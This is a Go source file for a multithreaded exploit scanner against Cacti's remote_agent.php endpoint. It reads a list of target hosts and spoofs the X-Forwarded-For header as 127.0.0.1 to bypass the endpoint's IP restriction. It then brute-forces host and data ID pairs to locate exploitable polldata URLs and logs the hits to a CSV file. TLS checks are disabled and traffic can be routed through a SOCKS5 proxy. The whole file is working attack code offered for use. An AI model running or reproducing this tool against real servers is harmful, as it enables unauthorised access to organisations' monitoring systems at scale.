package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/csv"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"time"

	log "github.com/sirupsen/logrus"
	"golang.org/x/net/proxy"
	"golang.org/x/sync/errgroup"
)

// Options ...
type Options struct {
	InputFile  string
	OutputFile string
	MinID      int
	MaxID      int
	Threads    int
	Proxy      string
}

// Result ...
type Result struct {
	Target string
	IP     string
	HostID string
	DataID string
	URL    string
}

func main() {
	// Parse flags
	var options Options
	flag.StringVar(&options.InputFile, "l", "", "List of targets (IP address)")
	flag.StringVar(&options.OutputFile, "oi", "results.txt", "Output file (CSV format)")
	flag.IntVar(&options.MinID, "min", 1, "Min ID to enumerate")
	flag.IntVar(&options.MaxID, "max", 10, "Max ID to enumerate")
	flag.IntVar(&options.Threads, "t", 1, "Number of threads")
	flag.StringVar(&options.Proxy, "proxy", "", "Socks5 Proxy")
	flag.Parse()

	// Validate flags
	var flagErr error
	switch {
	case options.InputFile == "":
		flagErr = errors.New("input file is required (-l targets.txt)")
	case options.OutputFile == "":
		flagErr = errors.New("output file is required (-ou results.txt)")
	case options.MinID <= 0:
		flagErr = errors.New("min cannot be less than 0")
	case options.MaxID < options.MinID:
		flagErr = errors.New("max cannot be less than min")
	case options.Threads < 1:
		flagErr = errors.New("threads cannot be less than 1")
	}
	if flagErr != nil {
		log.Fatalf("Exiting Program: %v", flagErr)
	}

	// Parse proxy
	var proxyURL *url.URL
	if options.Proxy != "" {
		p, err := url.Parse(options.Proxy)
		if err != nil {
			log.Fatalf("Exiting Program: invalid proxy: %v", err)
		}

		proxyURL = p
	}

	// Read input file
	inputFile, err := os.Open(options.InputFile)
	if err != nil {
		log.Fatalf("Exiting Program: failed to open input file: %v", err)
	}
	defer inputFile.Close()

	// Create output files
	outputFile, err := os.OpenFile(options.OutputFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		log.Fatalf("Exiting Program: failed to create output file: %v", err)
	}
	defer outputFile.Close()

	// Create channels
	targets := make(chan string)
	results := make(chan Result)

	// Create err group
	g, ctx := errgroup.WithContext(context.Background())

	// Queue targets
	g.Go(func() error {
		defer close(targets)

		scanner := bufio.NewScanner(inputFile)
		for scanner.Scan() {
			targets <- scanner.Text()
		}

		return nil
	})

	// Create workers
	for i := 0; i < options.Threads; i++ {
		g.Go(func() error {

			// Create HTTP transport
			transport := &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 100,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			}

			// Add proxy
			if proxyURL != nil {
				dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, nil, proxy.Direct)
				if err != nil {
					return fmt.Errorf("failed to connect to proxy: %s", err)
				}

				transport.Dial = dialer.Dial
			}

			// Create HTTP client
			client := http.Client{Timeout: 5 * time.Second, Transport: transport}

			// Consume queue
			for target := range targets {
				// Create logger
				logger := log.WithField("target", target)

				// Parse target
				host, port, err := net.SplitHostPort(target)
				if err != nil {
					logger.Errorf("Failed to parse target '%s': %v", target, err)
					continue
				}

				// Create base result
				result := Result{Target: target}

				// Build host
				var url string
				if port == "443" {
					url = "https://" + target
				} else {
					url = "http://" + target
				}

				// Bypass IP restriction
				for _, ip := range []string{"127.0.0.1", host} {
					logger.Infof("Attempting to bypass IP restriction with %s", ip)

					resp, err := request(ctx, client, url+"/cacti/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=1", ip)
					if resp == "[]" {
						result.IP = ip
						logger.Infof("Bypassed IP restriction with %s", ip)
					} else if err != nil {
						logger.Errorf("Failed to bypass IP restriction with %s: %v", ip, err)
					} else {
						logger.Errorf("Failed to bypass IP restriction with %s: invalid response", ip)
					}
				}

				// Check context and result
				if ctx.Err() != nil {
					return nil
				} else if result.IP == "" {
					continue
				}

				// Bruteforce ID
				result.HostID, result.DataID, result.URL = enumerate(ctx, client, logger, url, result.IP, options.MinID, options.MaxID)

				// Send result
				select {
				case <-ctx.Done():
					return nil
				default:
					results <- result
				}
			}

			return nil
		})
	}

	// Wait for workers
	go func() {
		g.Wait()
		log.Info("Closing results channel")
		close(results)
	}()

	// Process results
	var (
		total     int
		totalEnum int
	)
	csvWriter := csv.NewWriter(outputFile)
	csvWriter.Write([]string{"target", "ip", "host_id", "data_id", "url"})
	for result := range results {
		if err := csvWriter.Write([]string{result.Target, result.IP, result.HostID, result.DataID, result.URL}); err != nil {
			log.Fatalf("Exiting Program: failed to write to output file: %v", err)
		}

		if result.URL != "" {
			totalEnum++
		}
		total++
	}

	// Flush
	csvWriter.Flush()
	if err := csvWriter.Error(); err != nil {
		log.Errorf("Failed to write to output file: %v", err)
	}

	// Check for errors
	if err := g.Wait(); err != nil {
		log.Fatalf("Exiting Program: %v", err)
	}

	log.Infof("Total of %d/%d targets exploitable", totalEnum, total)
}

// enumerate id
func enumerate(ctx context.Context, http http.Client, logger *log.Entry, url, ip string, minID, maxID int) (string, string, string) {
	var errors int
	for x := minID; x <= maxID; x++ {
		for y := minID; y <= maxID; y++ {
			if errors >= 5 {
				return "", "", ""
			}

			var (
				hostID  = strconv.Itoa(x)
				dataID  = strconv.Itoa(y)
				enumURL = url + "/cacti/remote_agent.php?action=polldata&poller_id=1&host_id=" + hostID + "&local_data_ids[]=" + dataID
			)

			resp, err := request(ctx, http, enumURL, ip)
			if resp == "[]" {
				logger.Errorf("Failed ID enumeration with pair %d,%d", x, y)
			} else if err != nil {
				logger.Errorf("Failed ID enumeration with pair %d,%d: %v", x, y, err)
				errors++
			} else {
				logger.Infof("Successful ID enumeration with pair %d,%d", x, y)
				return hostID, dataID, enumURL
			}
		}
	}

	return "", "", ""
}

// request to target
func request(ctx context.Context, client http.Client, url string, spoofedIP string) (string, error) {
	// Create request
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return "", err
	}

	req.Header.Set("X-Forwarded-For", spoofedIP)

	// Perform request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("unexpected status code %d", resp.StatusCode)
	}

	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read body: %v", err)
	}

	return string(body), nil
}
